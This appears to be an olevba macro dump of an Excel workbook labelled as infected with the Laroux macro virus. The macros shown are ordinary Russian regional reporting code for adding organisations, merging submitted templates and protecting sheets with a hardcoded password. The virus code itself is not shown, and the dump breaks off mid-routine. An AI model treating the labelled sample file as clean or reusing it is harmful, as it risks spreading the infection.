Private Sub Worksheet_FollowHyperlink(ByVal Target As Hyperlink)
    On Error GoTo errhandler

Dim ws1 As Worksheet
Dim ws2 As Worksheet

Dim ws4 As Worksheet
'Dim ws5 As Worksheet
'Dim ws6 As Worksheet


Set ws1 = ActiveWorkbook.Sheets(sh1)
Set ws2 = ActiveWorkbook.Sheets(sh2)

Set ws4 = ActiveWorkbook.Sheets(sh4)
'Set ws5 = ActiveWorkbook.Sheets(sh5)
'Set ws6 = ActiveWorkbook.Sheets(sh6)

ws1.Unprotect "aq1sw2de3"
ws2.Unprotect "aq1sw2de3"

ws4.Unprotect "aq1sw2de3"
'ws5.Unprotect "aq1sw2de3"
'ws6.Unprotect "aq1sw2de3"

hyplink Target.Range, ActiveSheet

ws1.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

ws2.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

ws4.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws5.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
'ws6.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
'        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"


    Exit Sub
errhandler:
    MsgBox err.Description, vbOKOnly, ActiveSheet.name
End Sub

Sub hyplink(rg As Range, ws As Worksheet)
On Error GoTo err_

Dim i As Integer
Dim col_org As Integer
Dim NUM_COL As Integer
Dim NUM_ROW As Integer
Dim FormAd As String
Dim strdel As String

Dim r_spr As Range
Dim wb As Workbook

Dim ws_diap As Worksheet

Dim ws1 As Worksheet
Dim ws2 As Worksheet

Dim ws4 As Worksheet
'Dim ws5 As Worksheet
'Dim ws6 As Worksheet

Set wb = Application.ActiveWorkbook
Set ws_diap = wb.Sheets("Диапазоны")


Set ws1 = wb.Sheets(sh1)
Set ws2 = wb.Sheets(sh2)

Set ws4 = wb.Sheets(sh4)
'Set ws5 = wb.Sheets(sh5)
'Set ws6 = wb.Sheets(sh6)

'num_col1 = rg.cells(1, 1).Column

col_org = ws1.cells(1, 1).Value
NUM_ROW = rg.Row
NUM_COL = NUM_ROW - 2


'добавление блока
If rg.cells(1, 1).Value = "Добавить организацию" Then
    If Len(ws1.Range("I10").Value) = 0 Or Len(ws1.Range("K10").Value) = 0 Then
        MsgBox "Перед добавлением необходимо указать наименование МО и ОКТМО!", vbOKOnly + vbExclamation, ThisWorkbook.name
        ws1.Activate
        ws1.Range("I10:K10").Select
        Exit Sub
    End If
    
    PerConst.org = ""
    PerConst.pr_fil = ""
    PerConst.fil = ""
    PerConst.inn = ""
    PerConst.kpp = ""
    PerConst.vprod = ""
    
    PerConst.od = ""
    PerConst.nds = ""
    FlagAdd = True '************
    AddOrg rg.Row
    GoTo num
ElseIf rg.cells(1, 1).Value = "Изменить" Then
    If Len(ws1.Range("I10").Value) = 0 Or Len(ws1.Range("K10").Value) = 0 Then
        MsgBox "Перед изменением необходимо указать наименование МО и ОКТМО!", vbOKOnly + vbExclamation, ThisWorkbook.name
        ws1.Activate
        ws1.Range("I10:K10").Select
        Exit Sub
    End If
    FlagAdd = False '************
    UpdOrg rg.Row, ws1.Range("J" & rg.Row).Value
    GoTo num
ElseIf rg.cells(1, 1).Value = "Удалить" Then
    ws1.Activate
    ws.Rows(rg.Row).Select
    
    strdel = MsgBox("Вы уверены, что хотите удалить все данные об организации № " & rg.Row - 12 & " ?", vbYesNo + vbQuestion, "Подтверждение!")
    If strdel = vbYes Then
        ' Список организаций
        ws1.Rows(NUM_ROW).Delete
        ws1.cells(NUM_ROW - 1, 5).Select
        ' Баланс производство
        ws2.Rows(NUM_ROW).Delete
                
        ' Смета
        ws4.Columns(NUM_COL).Delete
        ws1.cells(1, 1).Value = ws1.cells(1, 1).Value - 1
        
'        ' Т и н
'        ws5.Rows(NUM_ROW).Delete
'
'        ' Перекрестное
'        ws6.Rows(NUM_ROW).Delete
        
        GoTo num
    Else
        Exit Sub
    End If
End If

Exit Sub

num:
'нумерация

Dim index As Integer

index = 1
For i = 13 To 12 + ws1.cells(1, 1).Value
    If InStr(1, ws1.cells(i, 5).Value, "Удалить") > 0 Then
          ' Список организаций
          ws1.cells(i, 6).Value = index
          ' Баланс производство
          
          ws2.cells(i, 6).Value = index
          ws2.cells(i, 7).Value = ws1.cells(i, 9).Value
          
          ' Смета
          ws4.cells(8, i - 2).Value = ws1.cells(i, 6).Value
          ws4.cells(9, i - 2).Value = ws1.cells(i, 9).Value
          ws4.cells(10, i - 2).Value = ws1.cells(i, 14).Value
          
'          ' Т и н
'          ws5.cells(i, 5).Value = ws1.cells(i, 14).Value
'          ws5.cells(i, 6).Value = index
'          ws5.cells(i, 7).Value = ws1.cells(i, 9).Value
'
'          ' Перекрестное
'          ws6.cells(i, 5).Value = ws1.cells(i, 14).Value
'          ws6.cells(i, 6).Value = index
'          ws6.cells(i, 7).Value = ws1.cells(i, 9).Value

          
          
          index = index + 1
    End If
Next

ws1.Activate
Exit Sub
err_:
MsgBox "Произошла ошибка обработки гиперссылки!"
End Sub
Sub fg()

Dim r As name
Dim i As Long


i = 1
    For Each r In ActiveWorkbook.Names
  r.Delete
       
       i = i + 1
    Next
End Sub





-------------------------------------------------------------------------------
VBA MACRO Module_for_change_spisok_MO.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module_for_change_spisok_MO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public Function Change_Spisok_MO(ran As Range) As Boolean

Dim ws_teh As Worksheet
Dim ws_spr As Worksheet
Dim rg As Range
Dim i As Integer
Dim oktmo As Long

Set ws_teh = Application.ActiveWorkbook.Sheets("TEHSHEET")
Set ws_spr = Application.ActiveWorkbook.Sheets("Титульный")
Set rg = ws_teh.Range("MUNOBR")

Change_Spisok_MO = False    ' если не попадет в следующее условие, то так и останется False

If ran.Address = "$F$9" Or ran.Address = "$F$9:$G$9" Then  'отлавливаем изменение в ячейке с названием выбранного МО,чтобы найти соответствующие ОКАТО и ОКТМО
    Application.ActiveWorkbook.Sheets("Титульный").Unprotect "aq1sw2de3"
    Dim SelectMO As String   'переменная, хранящая название выбранного из списка МО
    Dim NomRow As Integer
    Dim NomCol As Integer
    NomRow = ran.Row
    NomCol = ran.Column
    i = 2   ' начинаем со 2-й строки, см. лист "TEHSHEET"
            ' проверка на наличие нового значения, если NULL, то удалить
    If (IsEmpty(ran.Value) = True Or ran.Text = "") Then
        Application.ActiveWorkbook.Sheets("Титульный").Unprotect ("aq1sw2de3")
        ran.cells(1, 1).Offset(0, 2).Value = ""
        Application.ActiveWorkbook.Sheets("Титульный").Protect DrawingObjects:=False, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
        Change_Spisok_MO = True
        Exit Function
    End If
    
    SelectMO = ran.Value
    'проходим циклом по элементам списка "MUNOBR" и находим соответствующие ОКТМО и ОКАТО
    For i = rg.Row To rg.Row + rg.Rows.Count - 1

        If (ws_teh.cells(i, 1).Value = SelectMO) Then
           oktmo = ws_teh.cells(i, 3)
            ws_spr.cells(NomRow, NomCol + 3) = oktmo   'подставляем соответствующее ОКТМО
            Application.ActiveWorkbook.Sheets("Титульный").Protect DrawingObjects:=False, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
            Change_Spisok_MO = True
            Exit Function
        End If
    Next
End If

End Function


-------------------------------------------------------------------------------
VBA MACRO Help.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Help'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ЗАЩИТА ячеек на листе
Sub ProtectCells()
Dim i As Integer
Dim rg1 As Range
Dim w1 As Worksheet
Dim Col_index1 As Long
Dim Col_index2 As Long
Dim Col_index3 As Long

Col_index1 = 36
Col_index2 = 34
Col_index3 = 3
 ActiveSheet.Unprotect ("aq1sw2de3")

    ActiveSheet.cells.Select
    
'    Selection.Font.name = "Arial"
'    With Selection
'        .VerticalAlignment = xlCenter
'        .WrapText = True
'    End With
    
    Selection.Locked = True
    For Each rg1 In ActiveSheet.Range("A1:BA200").cells
        If rg1.Interior.ColorIndex = Col_index1 Or rg1.Interior.ColorIndex = Col_index2 Or rg1.Interior.ColorIndex = Col_index3 Then   'Or rg1.Interior.ColorIndex = Col_index2
            rg1.Select
            Selection.Locked = False
        End If
    Next
    ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"

End Sub
' ЗАЩИТА ИЗ-ЗА ЦВЕТА
Sub ProtectCells1()
Dim i As Integer
Dim rg1 As Range
Dim w1 As Worksheet
Dim Col_index1 As Long
Dim Col_index2 As Long
Dim Col_index3 As Long

Col_index1 = 36
Col_index2 = 34
Col_index3 = 3
 ActiveSheet.Unprotect ("aq1sw2de3")

    ActiveSheet.cells.Select
    Selection.Font.name = "Arial"
    With Selection
        .VerticalAlignment = xlCenter
        .WrapText = True
        .Orientation = 0
        .AddIndent = False
        .ReadingOrder = xlContext
    End With
    Selection.Locked = True
    For Each rg1 In ActiveSheet.Range("A1:BA300").cells
        If rg1.Interior.ColorIndex = Col_index1 Or rg1.Interior.ColorIndex = Col_index2 Or rg1.Interior.ColorIndex = Col_index3 Then   'Or rg1.Interior.ColorIndex = Col_index2
            rg1.Select
            Selection.Locked = False
            If rg1.Interior.ColorIndex = Col_index1 Then
                 With rg1.Validation
                            .Delete
                    .Add Type:=xlValidateDecimal, AlertStyle:=xlValidAlertStop, Operator _
                    :=xlGreaterEqual, Formula1:="0"
                    .IgnoreBlank = True
                    .InCellDropdown = True
                    .InputTitle = ""
                    .ErrorTitle = "Ошибка"
                    .InputMessage = ""
                    .ErrorMessage = "Допускается ввод только неотрицательных значений!"
                    .ShowInput = True
                    .ShowError = True
                
                End With
            End If
            
        End If
    Next
    ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
End Sub

' НУМЕРАЦИЯ с '
Sub НУМЕРАЦИЯ()
Dim r  As Range

For Each r In Selection.cells
    If Len(r.Value) > 0 Then
       r.Value = "'" & Left(r.Value, Len(r.Value) - 1)
    End If
Next
End Sub
' ДЕЛИТЬ НА ПРОЦЕНТ
Sub procent()
Dim r As Range

For Each r In Selection.cells
      r.FormulaR1C1 = r.FormulaR1C1 & "/100"
Next
End Sub
' ЗАПУСК ОБНОВЛЕНИЯ ЭКРАНА
Sub ScreenUpdating1()
    Application.ScreenUpdating = True
End Sub
'УДАЛЯЕТ ВСЕ, РАЗРЕШЕННЫЕ ДЛЯ ИЗМЕНЕНИЯ ДИАПАЗОНЫ СО ВСЕХ ЛИСТОВ
Sub EditRanges()
Dim w As Worksheet
Dim EdR As AllowEditRange
Dim k As Integer
Set w = ActiveSheet

For Each w In ActiveWorkbook.Sheets
    On Error Resume Next
    w.Unprotect "aq1sw2de3"
    For Each EdR In w.Protection.AllowEditRanges
        EdR.Delete
    Next
    w.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"
Next
End Sub
' УДАЛЕНИЕ ВСЕХ ИМЕНОВАННЫХ ДИАПАЗОНОВ
Sub DelRanges()

Dim r As name
Dim i As Long

Sheets("Лист5").Columns(1).ClearContents
Sheets("Лист5").Columns(2).ClearContents
i = 1
    For Each r In ActiveWorkbook.Names
        r.Delete
       'Sheets("Лист5").cells(i, 1).Value = r.Value
       'Sheets("Лист5").cells(i, 2).Value = r.NameLocal
       'i = i + 1
    Next
End Sub
' ClearContents ПО ВЫДЕЛЕННОМУ ДИАПАЗОНУ
Sub OcistClearContents()

Dim rg1 As Range

    For Each rg1 In Selection.cells
        If Len(rg1.Value) = 0 Then 'Or rg1.Interior.ColorIndex = Col_index2
            rg1.ClearContents
        End If
    Next

End Sub
' TRIM ПО ВЫДЕЛЕННОМУ ДИАПАЗОНУ
Sub OcistTrim()
Dim rg1 As Range

    For Each rg1 In Selection.cells
        If Len(rg1.Value) > 0 Then
            rg1.Value = Trim(rg1.Value)
        End If
    Next
End Sub
' ПРИНАДЛЕЖИТ ЛИ ЭЛЕМЕНТ ДИАПАЗОНУ
Function PrinadlDiapazon(rg As Range, ELEMENT As String) As Boolean

Dim cl As Range

PrinadlDiapazon = False
For Each cl In rg
    If cl.Value = ELEMENT Then
        PrinadlDiapazon = True
        Exit Function
    End If
Next

End Function
' ПРОХОД ПО ВСЕМ ВИДИМЫМ ЛИСТАМ и ЗАМЕНА ОПРЕДЕЛЕННОГО СЛОВА
Sub ProhodAndZamena()


Dim ws As Worksheet

For Each ws In Application.ActiveWorkbook.Sheets
    If ws.Visible = xlSheetVisible Then
        ws.Unprotect "aq1sw2de3"
        ws.Activate
        Range("B3").Select
        cells.Replace What:="Не определено", Replacement:="Итого", LookAt:=xlPart _
            , SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
            ReplaceFormat:=False
        ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        True, AllowFormattingColumns:=True, AllowFormattingRows:=True, Password:="aq1sw2de3"


    End If
Next

End Sub


-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
    FormRegion.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист6.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FormReestr.frm 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/FormReestr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub ComOK_Click()
Dim nomer As Integer

nomer = ListReestr.ListIndex
If nomer >= 0 Then
    
    PerConst.org = ListReestr.List(nomer, 2)
    PerConst.pr_fil = ListReestr.List(nomer, 3)
    PerConst.fil = ListReestr.List(nomer, 4)
    PerConst.inn = ListReestr.List(nomer, 5)
    PerConst.kpp = ListReestr.List(nomer, 6)
    PerConst.vprod = ListReestr.List(nomer, 7)
    
    'ActiveWorkbook.Sheets("REESTR").Range("A2:S35000").Delete Shift:=xlUp
    PerConst.od = ActiveWorkbook.Sheets("REESTR").cells(nomer + 2, 21).Value
    PerConst.nds = ActiveWorkbook.Sheets("REESTR").cells(nomer + 2, 22).Value
    Unload Me
Else
    MsgBox "Вы забыли указать организацию в списке!", vbCritical
End If

'Application.EnableEvents = True

End Sub
Private Sub ComOTSUT_Click()
    Unload Me
End Sub
Private Sub UserForm_Initialize()
    Label1.caption = ActiveWorkbook.Sheets(sh1).Range("I7").Value
    'ActiveWorkbook.Sheets("REESTR").Visible = xlSheetVeryHidden
    ActiveWorkbook.Sheets(sh1).Activate
End Sub



-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO load.bas 
in file: Virus.MSExcel.Laroux.of.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/load'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Base 1
Option Explicit

' **** ПРОВЕРКА+ВЫГРУЗКА ДАННЫХ ИЗ КОНКРЕТНОГО АТОМАРА ****
Public Function load_1(WB_SV As Workbook, WB_AT As Workbook) As String

Dim StrNalAllSheets As String   ' результат проверки на наличие всех листов
Dim sh(4) As String             ' названия листов АТОМАРА
Dim i As Integer

sh(1) = sh1
sh(2) = sh2
sh(3) = sh4
'sh(4) = sh5
'sh(5) = sh6
sh(4) = "Комментарии"

'---- ПРОВЕРКА НА НАЛИЧИЕ всех ЛИСТОВ В АТОМАРНОМ ШАБЛОНЕ -----
StrNalAllSheets = SVOD.NalichAllSheets(sh(), WB_AT)

load_1 = "Произошла ошибка при проверке данного шаблона от МО! Проверьте код шаблона '" & cod_sh & "' !!!"

'---- ПРОВЕРКА НА КОРРЕКТНЫЙ КОД ШАБЛОНА ---
On Error GoTo err_
If Not (WB_AT.CustomDocumentProperties("VERSION") = cod_sh) Then
    load_1 = "Данный файл не является шаблоном с кодом " & cod_sh & " !"
    GoTo err_
    
'---- ПРОВЕРКА НА НАЛИЧИЕ ВСЕХ ЛИСТОВ В АТОМАРЕ ----------------
ElseIf StrNalAllSheets <> "" Then
    load_1 = "В данном шаблоне от МО отсутствует лист '" & StrNalAllSheets & "'!"
    GoTo err_
    
'---- ПРОВЕРКА НА СОВПАДЕНИЕ РЕГИОНА ---
ElseIf WB_AT.Sheets("Список организаций").Range("I7").Value <> WB_SV.Sheets("Список организаций").Range("I7").Value Or Len(WB_AT.Sheets("Список организаций").Range("I7").Value) = 0 Then
    load_1 = "Регион, указанный в данном файл не совпадает с регионом указанным на листе 'Список организаций' данного шаблона!"
    GoTo err_

'---- ПРОВЕРКА НА СОВПАДЕНИЕ РЕГИОНА ---
ElseIf WB_AT.Sheets("Список организаций").Range("I10").Value <> WB_SV.Sheets("Список организаций").Range("I10").Value Or WB_AT.Sheets("Список организаций").Range("K10").Value <> WB_SV.Sheets("Список организаций").Range("K10").Value Then
    load_1 = "МО и ОКТМО, указанные в данном файле не совпадают с МО и ОКТМО указанными на листе 'Список организаций' данного шаблона!"
    GoTo err_
    
'---- ПРОВЕРКА НА НАЛИЧИЕ ОРГАНИЗАЦИЙ В АТОМАРЕ ----------------
ElseIf WB_AT.Sheets("Список организаций").Range("A1").Value = 0 Then
    load_1 = "В данном шаблоне от МО не найдено не одной организации!"
    GoTo err_
    
''---- ПРОВЕРКА НА УНИКАЛЬНОСТь ОРГАНИЗАЦИИИ ---
ElseIf SVOD.checkUnicalOrgAt(WB_AT) > 1 Then
    load_1 = "В данном шаблоне от МО встречаются организации с одинаковыми реквизитами!"
    GoTo err_

'---- ПРОВЕРКА НА УДОВЛЕТВОРЕНИЕ АТОМАРНОГО ШАБЛОНА ВСЕМ УСЛОВИЯМ ПРОВЕРКИ ПЕРЕД СОХРАНЕНИЕМ ---
Else
'    Dim RezMainProv As Integer ' результат проверки перед сохраением
'    RezMainProv = LoadCheck.checkBeforSaveAll(WB_SV, WB_AT)
'    If RezMainProv = 1 Then         ' ОШИБКА
'        load_1 = "Данный шаблон от МО удовлетворяет не всем условиям ОБЯЗАТЕЛЬНОЙ проверки! Смотрите комментарии на листе 'Проверка' данного шаблона!"
'        GoTo err_
'    ElseIf RezMainProv = 2 Then     ' ПРЕДУПРЕЖДЕНИЕ
'        load_1 = "Данный шаблон загружен, но данные в нем удовлетворяют не всем ПРЕДУПРЕЖДАЮЩИМ условиям проверки! Смотрите комментарии на листе 'Проверка' данного шаблона от МО!"
'    Else
'        load_1 = ""
'    End If
End If

load_1 = ""
'---- ВСЕ ПУТЕМ ---
If LoadSheets(WB_SV, WB_AT) = 2 Then
    load_1 = ""
End If
Exit Function

err_:

End Function

'******НЕПОСРЕДСТВЕННАЯ ВЫГРУЗКА ДАННЫХ ИЗ КОНКРЕТНОГО АТОМАРА /значения 1-ф. отработала УСПЕШНО; 2-????/******
Function LoadSheets(WB_SV As Workbook, WB_AT As Workbook) As Long ', WB_AT As Workbook

Dim i As Integer        'счетчик
Dim j As Integer        'счетчик

Dim ColOrg1 As Integer
Dim CurRow_main As Integer

Dim CurRow(4) As Integer    ' массив номер ТЕКУЩИХ строк на листах СВОДА/1-список орг; 2-все остальные/

Dim SdvigSv(4) As Integer   ' массив номеров строк с которых начинают добавляься данные на листах СВОДА
Dim Sv(4) As Worksheet      ' листы СВОДА
Dim At(4) As Worksheet      ' листы АТОМАРА
Dim ColOrgAT As Integer       ' количество организаций атомара //

Dim AtMO As String          ' МО АТОМАРА
Dim AtOKTMO As String       ' ОКТМО СВОДА

Dim ColMO As Integer
Dim ColOrgSovpMO As Integer ' количество организаций совпавшего МО
Dim ColPPSovpMO As Integer  ' количество вслучаев перепродаж совпавшего МО

Set Sv(1) = WB_SV.Sheets(sh1) ' листы СВОДА
Set Sv(2) = WB_SV.Sheets(sh2)
Set Sv(3) = WB_SV.Sheets(sh3)
Set Sv(4) = WB_SV.Sheets(sh4)
'Set Sv(5) = WB_SV.Sheets(sh5)
'Set Sv(6) = WB_SV.Sheets(sh6)


Set At(1) = WB_AT.Sheets("Список организаций")     ' листы АТОМАРА
Set At(2) = WB_AT.Sheets("Баланс")
Set At(3) = WB_AT.Sheets("Смета")
Set At(4) = WB_AT.Sheets("Смета")
'Set At(5) = WB_AT.Sheets("Тарифы и надбавки")
'Set At(6) = WB_AT.Sheets("Перекрестное субсидирование")

LoadSheets = 1  ' означает, что ф. отработала УСПЕШНО

AtMO = Trim(At(1).Range("I10").cells(1, 1).Value)          ' МО АТОМАРА
AtOKTMO = Trim(At(1).Range("K10").cells(1, 1).Value)       ' ОКТМО АТОМАРА

' -------- /ПРОВЕРКА НА СОВПАДЕНИЕ С УЖЕ СУЩЕСТВУЮЩИМ МО В СВОДЕ ---------
If Sv(1).Range("A1").Value = 0 Then    'ОРГАНИЗАЦИЙ В СВОДЕ НЕТ!
    GoTo ORG_NET_
Else                                    'ОРГАНИЗАЦИИ В СВОДЕ ЕСТЬ!
    LoadSheets = load.PoiskOrg(WB_SV, WB_AT)
    If LoadSheets = 2 Then
        Exit Function
    End If
End If
' -------- ПРОВЕРКА НА СОВПАДЕНИЕ С УЖЕ СУЩЕСТВУЮЩИМ МО В СВОДЕ/ ---------
ORG_NET_:
' определяем текущии строки на листах свода
ColOrg1 = Sv(1).Range("A1").Value
CurRow_main = 12 + ColOrg1

ColOrgAT = At(1).cells(1, 1).Value
'------------------добавление строк МО+ОРГ-----------------------
'======================= "Баланс", "Смета", "Список организаций" ======================
For i = 1 To ColOrgAT
    ' реквизиты
    PerConst.inn = At(1).Range("G" & (12 + i)).Value
    PerConst.kpp = At(1).Range("H" & (12 + i)).Value
    PerConst.org = At(1).Range("I" & (12 + i)).Value
    PerConst.pr_fil = At(1).Range("J" & (12 + i)).Value
    PerConst.fil = At(1).Range("K" & (12 + i)).Value
    PerConst.vprod = At(1).Range("L" & (12 + i)).Value
    PerConst.od = At(1).Range("M" & (12 + i)).Value
    PerConst.nds = At(1).Range("N" & (12 + i)).Value
    
    SVOD.AddOrg_from_MO CurRow_main + i
Next
'======================= "КомментарииМО": добавление строк + перенос значений ======================
'load.LoadComm WB_SV, WB_AT
'======================= "Перепродажа": добавление строк + перенос значений ======================


'----------------------ПЕРЕНОС ДАННЫХ В СВОД-----------------------------
''======================= Баланс ======================
For i = 1 To ColOrgAT
    For j = 1 To 13
        If Sv(2).cells(CurRow_main + i, 6 + j).Locked = False Then
            Sv(2).cells(CurRow_main + i, 6 + j).Value = At(2).cells(12 + i, 6 + j).Value ' 12 - сдвиг по строкам в атомаре; 6 - сдвиг по столбцам в атомаре
        End If
    Next
Next

' ======================= Смета ==============================
For i = 1 To ColOrgAT
    For j = 1 To 71
        If Sv(3).cells(10 + j, 10 + ColOrg1 + i).Locked = False Then
            Sv(3).cells(10 + j, 10 + ColOrg1 + i).Value = At(3).cells(10 + j, 10 + i).Value
        End If
    Next
Next

'''======================= Т и Н ======================
'For i = 1 To ColOrgAT
'    For j = 1 To 9
'        If Sv(5).cells(CurRow_main + i, 6 + j).Locked = False Then
'            Sv(5).cells(CurRow_main + i, 6 + j).Value = At(5).cells(12 + i, 6 + j).Value ' 12 - сдвиг по строкам в атомаре; 6 - сдвиг по столбцам в атомаре
'        End If
'    Next
'Next
'
''======================= ПС ======================
'For i = 1 To ColOrgAT
'    For j = 1 To 30
'        If Sv(6).cells(CurRow_main + i, 6 + j).Locked = False Then
'            Sv(6).cells(CurRow_main + i, 6 + j).Value = At(6).cells(12 + i, 6 + j).Value ' 12 - сдвиг по строкам в атомаре; 6 - сдвиг по столбцам в атомаре
'        End If
'    Next
'Next


Application.ScreenUpdating = True
Application.Calculation = xlCalculationAutomatic

End Function
'*****  ПРОВЕРКА НА СОВПАДЕНИЕ С УЖЕ СУЩЕСТВУЮЩИМ МО В СВОДЕ  ********
Function PoiskOrg(WB_SV As Workbook, WB_AT As Workbook) As Long

Dim i As Integer    'счетчик
Dim j As Integer    'счетчик

Dim i1_1 As Integer    'счетчик1_1
Dim i1_2 As Integer    'счетчик1_2
Dim i1_3 As Integer    'счетчик1_2

Dim Zamena As Integer       ' ???

Dim ColOrgAT As Integer ' количество орг атомара
Dim ColOrgSV As Integer ' количечтво орг свода

Dim RecvizitSv(6) As String ' набор идентифицирующих реквизитов

Dim NumRowSovp() As Integer ' МАССИВ номеров строк свода в которых находятся орг совпавшие с атомаром
Dim SovpRecv As Integer     ' количество совпадений реквизитов (полное - 6)
Dim ColSovpOrg As Integer   ' количество совпавших организаций
Dim StrNumRowSovp As String ' перечисление через запятую номеров всех совпавших орг свода

Dim SvSpr As Worksheet
Dim AtSpr As Worksheet

Set SvSpr = WB_SV.Sheets(sh1) ' лист СВОДА
Set AtSpr = WB_AT.Sheets(sh1) ' лист АТОМАРА

ColOrgSV = SvSpr.Range("A1").Value
ColOrgAT = AtSpr.Range("A1").Value

' ЦИКЛ ПО ВСЕМ ОРГАНИЗАЦИЯМ С ЦЕЛЬЮ ОБНАРУЖИТЬ ТОЖЕ МО, ЧТО И В АТОМАРЕ
i1_1 = 13
ColSovpOrg = 0

' ЦИКЛ по всем организациям СВОДА
For i1_1 = 13 To 12 + ColOrgSV
    ' реквизиты организации из свода
    For j = 1 To 6
        RecvizitSv(j) = Trim(LCase(SvSpr.cells(i1_1, 6 + j).Value))
    Next
    
    ' сравнение со всеми организациями АТОМАРА
    For i1_2 = 13 To 12 + ColOrgAT
        For j = 1 To 6
            If RecvizitSv(j) = Trim(LCase(AtSpr.cells(i1_2, 6 + j))) Then
                SovpRecv = SovpRecv + 1
            Else
                Exit For
            End If
        Next
        If SovpRecv = 6 Then
            ' формируем массив совпавших организаций
            ColSovpOrg = ColSovpOrg + 1
            ReDim Preserve NumRowSovp(ColSovpOrg)
            NumRowSovp(ColSovpOrg) = i1_1
            SovpRecv = 0
            Exit For
        End If
        SovpRecv = 0
    Next
Next

' ЕСЛИ совпадения есть
'1.1
If ColSovpOrg > 0 Then
    ' формируем перечисление через запятую номеров всех совпавших орг свода
    StrNumRowSovp = ""
    For i = 1 To ColSovpOrg
       StrNumRowSovp = StrNumRowSovp & (NumRowSovp(i) - 12) & "," ' -12 - для того чтобо показать номер орагнизации
    Next
    StrNumRowSovp = Left(StrNumRowSovp, Len(StrNumRowSovp) - 1) ' убираем последнюю запятую
    
    '2.1 /спрашивать/
    If Propusk = "Спрашивать" Then
        Application.ScreenUpdating = True
        ThisWorkbook.Activate
        SvSpr.Activate
        Zamena = MsgBox("Организации из файла: " & WB_AT.name & " уже присутствует в данном шаблоне под номерами: " & StrNumRowSovp & ". Вы уверены, что хотите обновить данные об этих организациях?", vbYesNo, "Вопрос о ЗАМЕНЕ")
        Application.ScreenUpdating = False
        If Zamena = vbYes Then
            For i = 1 To ColSovpOrg
                 SVOD.DelOrg (NumRowSovp(i) + 1 - i)
            Next
        Else
            PoiskOrg = 2
            Exit Function
        End If
    '2.2 /заменять/---------------------------------------------------------------------
    ElseIf Propusk = "Заменять" Then
        For i = 1 To ColSovpOrg
                 SVOD.DelOrg (NumRowSovp(i) + 1 - i)
        Next
    '2.3/пропускать/---------------------------------------------------------------------
    Else
        PoiskOrg = 2
        Exit Function
    End If
'1.2--------------------------------------------------------------------------
Else
    
End If

End Function
'' перегрузка комментариев МО в шаблон от региона
'Sub LoadComm(WB_SV As Workbook, WB_AT As Workbook)
'
'Dim SvCom As Worksheet
'Dim AtCom As Worksheet
'
'Dim MO As String
'Dim OKTMO As String
'
'Dim i As Integer
'Dim num_com As Integer
'
'Dim FlagNalichCom As Boolean ' флаг наличия комментариев МО
'Dim CurRow As Integer
'
'Set SvCom = WB_SV.Sheets("КомментарииМО")
'Set AtCom = WB_AT.Sheets("Комментарии")
'SvCom.Unprotect "aq1sw2de3"
'
'' начальные значения
'num_com = 1
'FlagNalichCom = False
'CurRow = 14 + SvCom.Range("B1").Value
'
'MO = Trim(WB_AT.Sheets("Список организаций").Range("I10").Value)
'OKTMO = Trim(WB_AT.Sheets("Список организаций").Range("K10").Value)
'
'For i = 1 To 10
'    WB_SV.Activate
'    If Len(Trim(AtCom.Range("C" & (4 + i)).Value)) > 0 Then
'        FlagNalichCom = True
'        SvCom.Rows(CurRow & ":" & CurRow).Insert
'        WB_SV.Sheets("Диапазоны").Activate
'        WB_SV.Sheets("Диапазоны").Range("ADD_COMM").Copy
'        SvCom.Activate
'        SvCom.Range("D" & CurRow).Select
'        SvCom.Paste
'        SvCom.Rows(CurRow & ":" & CurRow).EntireRow.AutoFit
